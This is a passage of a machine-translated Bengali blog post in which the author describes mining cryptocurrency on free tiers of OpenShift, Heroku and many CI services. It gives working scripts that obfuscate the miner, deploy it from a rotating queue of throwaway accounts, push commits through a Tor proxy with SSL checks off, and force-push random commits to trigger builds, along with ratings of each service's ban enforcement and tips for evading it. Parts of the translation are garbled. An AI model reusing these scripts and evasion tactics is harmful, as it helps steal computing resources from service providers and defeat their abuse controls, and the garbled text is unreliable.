cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>এটি খনির পাত্রে নির্মাণের জন্য ব্যবহৃত স্ক্রিপ্ট যা একটি যমল টেমপ্লেট প্রয়োজন:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>কিন্তু পুরো প্রক্রিয়াটিতে বেশ কয়েকটি ধাপ জড়িত ছিল!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>ছদ্ম কোডে:<ul><li><p>প্রকল্প তৈরি করুন<li><p>একটি ছবি ছাড়া অ্যাপ্লিকেশন তৈরি করুন<li><p>খনির ধারক তৈরি করা<li><p>একটি স্থাপনার কনফিগারেশন সহ কন্টেইনার স্থাপন করুন (কুবারনেটস বিমূর্ততা)<li><p>স্থাপনার রোলআউট</ul><p>দ্য<code>build-build</code> স্ক্রিপ্ট পরিবর্তে একটি তৈরি<em> নির্মাণ</em> ধারক যা একবারে কয়েক ঘন্টার জন্য খনি হবে। বিল্ডস এবং নরমাল শুঁড়ির ওপেনশিফ্টে আলাদা সম্পদ আছে তাই আমরা তাদের উভয়কেই কাজে লাগিয়েছি। ওপেনশিফ্ট সামগ্রিকভাবে একটি খারাপ অভিজ্ঞতা ছিল যেহেতু এটি 4 টি ভিন্ন রিলিজ (সম্ভবত আরও কিছু, আমি কিছুক্ষণ পরে ট্র্যাকিং বন্ধ করে দিয়েছিলাম) এবং তাদের প্রত্যেকের কনফিগারেশনে প্রয়োজনীয় পরিবর্তন ছিল, তাদের কোন আপগ্রেড পথ ছিল না এবং সবকিছু দ্রুত পুনরাবৃত্তি হয়েছিল, এবং এটি সাধারণ ছিল বিল্ড/পড স্টল করার জন্য, এবং আবর্জনা সংগ্রহ না করার জন্য ... তারা সাধারণত ম্যানুয়াল রিস্টার্টগুলি একবারে একবার চালায়, সম্ভবত কুবারনেটগুলি কেবল বগি ছিল :)<p>হেরোকু কনফিগারেশনটি একটু সহজ ছিল (এতে কুবেরনেটস জড়িত নয়)। কন্টেইনার বিল্ড ছাড়াও, যা ওপেনশিফ্টের অনুরূপ ছিল, বাকিগুলি ছিল মাত্র দুটি ক্লি কমান্ড<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>কন্টেইনারটি সরাসরি ডকার দিয়ে হেরোকু রেজিস্ট্রিতে ঠেলে দেওয়া হয়েছিল।<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> হেরকু (যা মুক্ত স্তর এখনও লেখার সময় পর্যন্ত দাঁড়িয়ে আছে) এর সাথে ঘর্ষণ হল যে ডাইনোস প্রতি মাসে মাত্র 22 দিন চলতে পারে তাই তাদের প্রতি মাসে কিছু ম্যানুয়াল ব্যবস্থাপনা প্রয়োজন, আবার ক্লান্তি এবং বিরক্তিকর। তারা শুরুতে কিছু নিষেধাজ্ঞা তরঙ্গ কার্যকর করেছিল এবং তারপরে তারা টিওআর -এর মাধ্যমে নিবন্ধন অক্ষম করেছিল, আমি নিশ্চিত যে আমি এর কারণ ছিলাম।<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> সিআই কন্টেইনার বা ভিএম</a></h3><p>এগুলি ছিল আমাদের ড্রপারের জন্য সবচেয়ে সিনার্জিক লক্ষ্য। এখানে অনেক<a href=https://en.wikipedia.org/wiki/Continuous_integration> সিআই</a> কোম্পানি, যার মধ্যে অনেকগুলি বিনিয়োগকারীদের অর্থ জ্বালিয়ে দিচ্ছে কারিগরি অবকাঠামো ব্যবসায় কিছু বাজার অংশ সংগ্রহের আশায় বিনামূল্যে স্তর অফার করছে।<p>এই সমস্ত পরিষেবাগুলি বিভিন্ন সংস্থান সরবরাহ করে, বিভিন্ন কনফিগারেশনের প্রয়োজনীয়তা থাকে এবং বিভিন্ন পরিবেশে চলে। আমি কখনও স্বয়ংক্রিয় অ্যাকাউন্ট নিবন্ধনের কথা ভাবিনি কারণ এই ধরনের জিনিসগুলি প্রোগ্রামের জন্য ভয়ঙ্কর, আমি সব সময় এগুলি এড়ানোর চেষ্টা করি, তাই আমি কিছু সময়ের জন্য ম্যানুয়াল রেজিস্ট্রেশন সহ্য করেছি কারণ আমি কৌতূহলী ছিলাম যে কোন ধরনের স্প্যাম বিরোধী প্রতিক্রিয়া পাব (এবং বাকিদের থেকে কতটা আলাদা!)। আপনি একটি কোম্পানির ম্যানেজমেন্ট সম্পর্কে কিছু বিষয় অনুমান করতে পারেন যে এটি কিভাবে স্প্যাম পরিচালনা করে:<ul><li><p>এটি কি নিষিদ্ধ তরঙ্গ সঞ্চালন করে? তারপরে তাদের কঠোর নীতি নেই, সমস্যাগুলি ম্যানুয়ালি পরিচালনা করা হয় এবং একেকটি কেস<li><p>এর জন্য কি ফোন ভেরিফিকেশন প্রয়োজন? অতীতে তারা ইতিমধ্যে নির্যাতিত হয়েছিল<li><p>তারা কি ভারী সম্পদ ব্যবহারের সাড়া দেয়? তারা কঠোর বাজেটে চলছে<li><p>তারা কি অ্যাকাউন্ট বিধিনিষেধ বা ছায়া নিষেধাজ্ঞা প্রয়োগ করে? যদি তারা নিষিদ্ধ ছায়া, তাদের মানে sysadmins আছে।</ul><p>একটি দার্শনিক প্রশ্নও আছে: যদি একটি পরিষেবা আপনাকে দীর্ঘদিন ধরে তাদের সিস্টেমের অপব্যবহার করতে দেয়, তাহলে এর অর্থ কি তাদের কাছে একটি শীর্ষস্থানীয় অবকাঠামো রয়েছে যা বোঝা পরিচালনা করতে সক্ষম, অথবা কেবল তাদের সিস্টেমের উপর দুর্বল নিয়ন্ত্রণ? এবং আপনাকে অবশ্যই অ্যাক্সেসযোগ্যতা এবং সুরক্ষার মধ্যে ভারসাম্য বিবেচনা করতে হবে, খুব নিরাপদ একটি সিস্টেম ব্যবহারকারীর ধারণ ক্ষমতা কমিয়ে দিতে পারে।<p>এখানে এমন কিছু টেবিল দেখানো হয়েছে যা আমি মোতায়েন করেছি:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>কনফিগারেশন<th style=text-align:center>কর্মক্ষমতা<th style=text-align:center>নিষেধাজ্ঞা হাতুড়ি<tr><td style=text-align:center>বিট্রাইজ<td style=color:red;text-align:center>খারাপ<td style=color:#ff0;text-align:center>মধ্যম<td style=color:#ff0;text-align:center>মধ্যম<tr><td style=text-align:center>ট্র্যাভিস<td style=color:green;text-align:center>ভাল<td style=color:#ff0;text-align:center>মধ্যম<td style=color:green;text-align:center>ভাল<tr><td style=text-align:center>কোডশিপ<td style=color:#ff0;text-align:center>মধ্যম<td style=color:red;text-align:center>খারাপ<td style=color:#ff0;text-align:center>মধ্যম<tr><td style=text-align:center>গিটল্যাব<td style=color:#ff0;text-align:center>মধ্যম<td style=color:green;text-align:center>ভাল<td style=color:green;text-align:center>ভাল<tr><td style=text-align:center>বৃত্ত<td style=color:red;text-align:center>খারাপ<td style=color:green;text-align:center>ভাল<td style=color:#ff0;text-align:center>মধ্যম<tr><td style=text-align:center>সেমাফোর<td style=color:green;text-align:center>ভাল<td style=color:green;text-align:center>ভাল<td style=color:#ff0;text-align:center>মধ্যম<tr><td style=text-align:center>ডকার<td style=color:#ff0;text-align:center>মধ্যম<td style=color:#ff0;text-align:center>মধ্যম<td style=color:green;text-align:center>ভাল<tr><td style=text-align:center>কোয়ে<td style=color:green;text-align:center>ভাল<td style=color:#ff0;text-align:center>মধ্যম<td style=color:#ff0;text-align:center>মধ্যম<tr><td style=text-align:center>কোডফ্রেশ<td style=color:red;text-align:center>খারাপ<td style=color:green;text-align:center>ভাল<td style=color:#ff0;text-align:center>মধ্যম<tr><td style=text-align:center>ওয়ার্কার<td style=color:#ff0;text-align:center>মধ্যম<td style=color:#ff0;text-align:center>মধ্যম<td style=color:red;text-align:center>খারাপ<tr><td style=text-align:center>অজুর-পাইপলাইন<td style=color:#ff0;text-align:center>মধ্যম<td style=color:#ff0;text-align:center>মধ্যম<td style=color:red;text-align:center>খারাপ<tr><td style=text-align:center>ধারাবাহিক PHP<td style=color:red;text-align:center>খারাপ<td style=color:#ff0;text-align:center>মধ্যম<td style=color:#ff0;text-align:center>মধ্যম<tr><td style=text-align:center>বন্ধু<td style=color:red;text-align:center>খারাপ<td style=color:red;text-align:center>খারাপ<td style=color:red;text-align:center>খারাপ<tr><td style=text-align:center>ড্রোন<td style=color:red;text-align:center>খারাপ<td style=color:green;text-align:center>ভাল<td style=color:red;text-align:center>খারাপ<tr><td style=text-align:center>আবেদনকারী<td style=color:red;text-align:center>খারাপ<td style=color:#ff0;text-align:center>মধ্যম<td style=color:red;text-align:center>খারাপ<tr><td style=text-align:center>নেভারকোড<td style=color:red;text-align:center>খারাপ<td style=color:green;text-align:center>ভাল<td style=color:#ff0;text-align:center>মধ্যম<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>খারাপ<td style=color:green;text-align:center>ভাল<td style=color:red;text-align:center>খারাপ</table><p>এই প্রসঙ্গে, ক<span style=color:green> ভাল</span> কনফিগারেশন মানে এটি কনফিগার করতে বেশি সময় নেয়নি<code>ci</code> খনির প্রক্রিয়ার কাজ<span style=color:red> খারাপ</span><code>ban-hammer</code> এর মানে হল যে পরিষেবাটিতে নিবন্ধন করা কঠিন ছিল, অথবা অ্যাকাউন্টগুলি আরও আক্রমণাত্মকভাবে নিষিদ্ধ করা হবে।<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> বিট্রাইজ</a> একটি প্রজেক্ট সেটআপ করতে হবে, পরিবেশ, টার্গেট আর্কিটেকচার, এক্সিকিউশন প্রক্রিয়া এবং অন্যান্য জিনিসগুলি অনুমান করতে হবে, এটি একটি বিল্ড সেটআপ করতে খুব সময় নেয়, তাই এটি কনফিগারেশনে খারাপ রেটিং পেয়েছে।<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> ধারাবাহিক PHP</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> বন্ধু</a> , [কোডফ্রেশ] এরও অনেক ম্যানুয়াল অ -ঘোষণামূলক কনফিগারেশন ধাপ ছিল।<p>[Azure-pipelines] এর মতো পরিষেবা,<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> ওয়ার্কার</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> বন্ধু</a> অ্যাকাউন্টগুলিতে ছায়া-নিষেধাজ্ঞা প্রযোজ্য, ছায়া-নিষেধাজ্ঞাগুলি খারাপ, কারণ তারা আপনার কনফিগারেশনে কিছু ভুল আছে কিনা তা অনুমান করতে ছেড়ে দেয়। কিছু পরিষেবার মাধ্যমে আপনি নিষেধাজ্ঞার কারণ অনুমান করতে পারেন (আপনার নির্মাণে খুব বেশি সময় লেগেছে, অথবা আপনি অল্প সময়ের মধ্যে অনেকবার নির্মাণ করেছেন), [Azure-pipelines] এর মত অন্যদের জন্য আমি ধরে নিচ্ছি তারা কোন ধরনের আঙুলের ছাপ প্রয়োগ করেছে ব্যবহারকারীর সংগ্রহস্থলগুলিতে নিষেধাজ্ঞাগুলি এমনকি কোনও সম্পদের অপব্যবহার ছাড়াই আসছে, নীল এবং ভার্সেলও সীমাবদ্ধ<code>DNS</code> পাবলিক বিল্ড মেশিনের মধ্যে অ্যাক্সেস, যাতে অতিরিক্ত ঘর্ষণ ছিল যা অ্যাড-হক টানেলের মাধ্যমে কাটিয়ে উঠতে হবে।<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> ড্রোন</a> সম্পূর্ণ 16+ কোর প্রসেসরে অ্যাক্সেস দিয়েছে কিন্তু 2 টি বিল্ডের পরে নিষিদ্ধ করা শেষ করেছে<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> কোডশিপ</a> এছাড়াও শক্তিশালী বিল্ড হোস্টগুলিতে অ্যাক্সেস দেয় এবং ড্রোনের মতো আক্রমণাত্মকভাবে নিষিদ্ধ করেনি।<p>আমার প্রিয় পরিষেবাগুলি লাভজনকতার কারণে নয় বরং সহজ এবং সুবিধার জন্য (অন্যান্য প্রকল্পের সাথেও) ছিল<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> ট্র্যাভিস</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> সেমাফোর</a> এবং<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> ডকার-হাব</a> । ট্র্যাভিস স্ট্যান্ডার্ড সিআই এর মতো এবং খুব নমনীয়, সেমাফোর একমাত্র<code>DSL</code> জন্য<code>CI</code> যা অন্য ইউআই-এর মতো স্প্যাগেটিফাইড চেক-বক্সের সীমাহীন ক্রমের পরিবর্তে, এবং ডকার কেবল ডকারফাইলের নির্মাণের সরলতার জন্য সহজলভ্য এবং ভাল লাগছিল।<h3 id=builds_configs><a class=header-anchor href=#builds_configs> কনফিগার তৈরি করে</a></h3><p>ওয়েব পরিষেবাগুলির দ্বারা প্রদত্ত ক্রন কাজের দ্বারা বা গিট কমিটের মাধ্যমে বিল্ডগুলি ট্রিগার করা হয়েছিল। সুতরাং আপনাকে সমস্ত গিট কমিটগুলি পরিচালনা করতে অ্যাক্সেস টোকেন বা এসএসএইচ কীগুলির আবর্জনা রাখতে হবে। ওভার-স্প্যাম কমিট না করা এবং গিট কনফিগার করার রিপোজিটরিগুলিতে চাপ দেওয়ার সময় প্রক্সি ব্যবহার করাও গুরুত্বপূর্ণ ছিল:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>গিট হোস্টিং পরিষেবাগুলি ব্যবহার করে, গিথুব নিষেধাজ্ঞা সম্পর্কে আরও পুঙ্খানুপুঙ্খ ছিল, তবে সেগুলি কেবলমাত্র সিআই সার্ভিস অ্যাডমিনদের দ্বারা অপব্যবহারের প্রতিবেদনে কার্যকর করা হয়েছিল, গিটল্যাব একবার নিষেধাজ্ঞা জারি করেছিল, যখন আমি সিআই ট্রায়াল পুনর্নবীকরণ করার চেষ্টা করেছি (অসতর্কভাবে)। আমি কখনোই বিটবকেট অ্যাকাউন্টের জন্য নিষেধাজ্ঞা পাইনি। (জোর) ধাক্কা git প্রতিশ্রুতি, আমরা একটি দীর্ঘ চলমান লুপ যে git সংগ্রহস্থল পুনরায় ট্যাগ আছে:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>এটা সম্ভব হতে পারে যে এইভাবে জোর করাটা গিথুবকে খুব পছন্দ করে না এবং অ্যাকাউন্টগুলিকে পতাকাঙ্কিত করার কারণ হতে পারে। ট্যাগার ফাংশনটি জোরপূর্বক একটি ভিন্ন কমিটকে ধাক্কা দেয়, একটি ওয়েবসাইট ব্যবহার করে (যা আপনি খুব সহজেই দেখতে পারেন) যা কিছু এলোমেলো কমিট দেয়। আমি নিশ্চিত নই যে এটি কতটা সাহায্য করে, যেহেতু প্রতিশ্রুতির বিষয়বস্তু স্পষ্টতই আমার ক্ষেত্রে সন্দেহজনক। এবং এটি আমাকে একবার পাছায়ও কামড়েছিল, যেহেতু এই আদেশ দ্বারা ফেরত দেওয়া প্রতিশ্রুতিগুলি শপথ শব্দগুলি অন্তর্ভুক্ত করতে পারে, আমার একটি প্রতিশ্রুতি একটি টুইটার বট দ্বারা নেওয়া হয়েছিল যা শপথের শব্দগুলির সাথে গিট কমিটগুলি ট্র্যাক করে! আমি ঘটনার পরে খারাপ শব্দের জন্য একটি কালো তালিকা যুক্ত করেছি।<p>আমি সত্যিই অস্পষ্ট গিট কমিট এবং আবদ্ধ গিট রিপোজিটরিগুলির মধ্যে অনুসন্ধান করি নি। একমাত্র উদাহরণ যেখানে আমি আরও বিস্তৃত সংগ্রহস্থল ব্যবহার করছিলাম বিট্রাইজের সাথে ছিল যেহেতু আপনি একটি বিল্ড সেটআপ করতে পারতেন না যদি সিস্টেম একটি পরিবেশ (মোবাইল অ্যাপস) চিনতে না পারে, কিন্তু তারপরও কোন ঘূর্ণন ছিল না এবং এটি সর্বদা একই ছিল সংগ্রহস্থল, স্পট করা বেশ সহজ।<p>সামগ্রিকভাবে, যদি আমি আমার সময় অনুকূল সময় একটি বেল বক্ররেখা চক্রান্ত করতে হবে<em> ছাড়া</em>সমস্ত পরীক্ষিত পরিষেবা জুড়ে অ্যাকাউন্ট নিষিদ্ধ করা, প্রতিদিন 1 বার কেন্দ্রের সাথে 1 ঘন্টা বিল্ড সময়কাল থাকবে। সিপিইউ কোরের জন্য, কয়েকজন মিথ্যাবাদী (ড্রোন) এর জন্য, বেশিরভাগ পরিষেবা আশা করে যে আপনি আপনাকে প্রদত্ত সম্পদের পূর্ণ পরিমাণ ব্যবহার করবেন কারণ বিল্ডগুলি ভিএম বা সীমাবদ্ধ সম্পদ সহ পাত্রে চালানো হয় ... এবং সংকলন সাধারণত একটি কাজ যা cpu saturates, তাই এর পরিসংখ্যানগত প্রাসঙ্গিকতা নেই। স্বতitiveস্ফূর্তভাবে প্রতিদিন একটি বিল্ড গড়ে ডেভেলপার কি করবে, তাই আপনি যদি উত্থাপিত পতাকা প্রত্যাশা করেন যদি আপনি গড় থেকে দূরে সরে যান এবং অপব্যবহারের জন্য চাপ দেওয়া কখনই ভালভাবে শেষ হয় না।<h2 id=conclusions><a class=header-anchor href=#conclusions> উপসংহার</a></h2><p>এটা কি মূল্য ছিল? নেটওয়ার্কিং অংশগুলি অবশ্যই আকর্ষণীয় ছিল, অ্যাকাউন্ট নিবন্ধনের সাথে কাজ করা স্পষ্টতই সবচেয়ে খারাপ অংশ ছিল, নোবডিগুলি অবিরাম নিশ্চিতকরণ ইমেলগুলি ক্লিক করতে পছন্দ করে এবং সব পরেই মন অসাড় UI পদ্ধতিগুলি পুনরাবৃত্তি করে। স্প্যাম অটোমেশন সফ্টওয়্যার লেখাও বিরক্তিকর (কারণ আপনার বেশিরভাগই বোবা API গুলিতে পোক করছে), এবং এই অনুমানের সাথে (এবং এই সত্য যে এটি কখনই গুরুতর কিছু ছিল না) আমি এমনকি এটি বিবেচনা করি নি। এটা কি লাভজনক ছিল? এর চূড়ায় এটি এমন কিছুতে পৌঁছেছিল<code>300$</code> প্রতি মাসে, হয়তো ভেনেজুয়েলার জন্য যথেষ্ট, সত্যিই আমার জন্য নয় :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> খামখেয়ালি sysadmin</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>যদিও এটি অনেক গোপনীয়তা অনুমানকে ভেঙে দেবে, আমি নিশ্চিত যে তাদের মধ্যে বেশিরভাগই যখনই একটি আসন্ন সমস্যা হয় তখনই ভিতরে উঁকি দেয়, কিন্তু এটি কেবলমাত্র কন্টেইনার ভিত্তিক রানটাইমগুলির জন্য একটি সমস্যা, যেখানে ভিএমগুলি অনেক বেশি কালো বাক্স।</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>মনিরো নোডে নির্মিত খনিটি এটিকে আরও ব্যাকগ্রাউন্ড বান্ধব করার জন্য কিছু কাজ পেয়েছিল, কিন্তু xmrig এর বিতরণ কখনও ব্যাকগ্রাউন্ড বন্ধুত্বের দিকে মনোনিবেশ করা হয়নি।</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>কিছু পুল বিভিন্ন সংযোগ পোর্টে বিভিন্ন অসুবিধা প্রদান করে, এবং খনির জমা দেওয়া শেয়ারগুলিতে কাজের অসুবিধা সারিবদ্ধ করতে থাকে, কিন্তু প্রক্সির গ্রানুলারিটি এখনও আরও সুবিধাজনক ছিল, কারণ এটি পুলকে প্রতিরোধ করবে<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> বন্ধ করা</a> (যদিও আমরা কখনই পুল সুইচ করিনি)</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>যখন কনফিগারেশনটি হঠাৎ উপস্থিত হয়েছিল এবং ফাইল সিস্টেম থেকে অদৃশ্য হয়ে গেল তখন এটি খুশি হয়নি</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>আমরা এর সম্পর্কে কথা বলি না<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> স্তর প্রোটোকল</a> যেহেতু আমাদের যা বাস্তবায়িত হয়েছে তা মোকাবেলা করতে হবে<em> উভয়</em> পুল এবং খনি ... যা সাধারণত সর্বনিম্ন, এবং সম্ভবত অ -মানক এক্সটেনশনের সাথে।</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>কখনো পুরো বাশে যাবেন না :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>রানটাইম -এ যখন কোন প্রসেস অতিরিক্ত কার্যকারিতা লোড করে তখন কী হয় তা আমি অনুসন্ধান করি নি, কার্নেল এক্সিকিউটেবলের মেমরি লেআউটে ঠিকানা খুঁজবে, যা ফাইল সিস্টেম অ্যাক্সেস করবে এবং সম্ভবত একটি ক্র্যাশ ঘটাবে।</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>সীমাগুলি নির্বিচারে, cpu সময় এক সেকেন্ডের কম, মেমরি 128M এর কম, আউটবাউন্ড সংযোগগুলি অবরুদ্ধ।</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>একটু ধৈর্যের সাথে আপনি আপনার cpanel অ্যাকাউন্ট স্পেসের চারপাশে বুটস্ট্র্যাপ করা পরিবেশের উপর একটি পূর্ণ ssh উদাহরণ চালাতে পারেন,<em> ছাড়া</em> CPANEL বিল্টিন SSH- এ অ্যাক্সেস থাকা যা হোস্টিং প্রদানকারীদের দ্বারা অক্ষম হয়ে থাকে।</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>ওপেনশিফট 1 বছরের বিনামূল্যে স্তর থেকে 3 মাস থেকে 1 মাস পর্যন্ত গিয়েছিল, ফোন প্রমাণীকরণের প্রয়োজন শুরু করে, আমি গ্যারান্টি দিতে পারি যে আমি কেবল তাদের পরিষেবাগুলি অপব্যবহার করিনি।</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>হেরোকু ফ্রি টিয়ার কন্টেইনারগুলি সম্পদে বেশ উদার, তারা 4c/8t (ভার্চুয়াল) সিপাস, প্রচুর পরিমাণে র and্যাম এবং বড় স্টোরেজ সরবরাহ করে (যা ডাইনো শাটডাউনে স্থায়ী হয় না এবং বাতিল করা হয়)।</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>তারা বেশ কিছু নিষেধাজ্ঞার পরে, মিউক কঠোর নিবন্ধনের নিয়ম যুক্ত করে, আমি এতে অবদান রাখতে পারি।</table><p><div class=page-foot><div class=copyright></div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - দ্বারা চালিত<a href=https://github.com/tlienart/Franklin.jl> ফ্রাঙ্কলিন</a></div><div class=page__footer-links>- <ul><li><a href=/bn/sitemapxml> সাইটম্যাপ</a></li> | <li><a href=/bn/tag> ট্যাগ</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> আরএসএস</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter 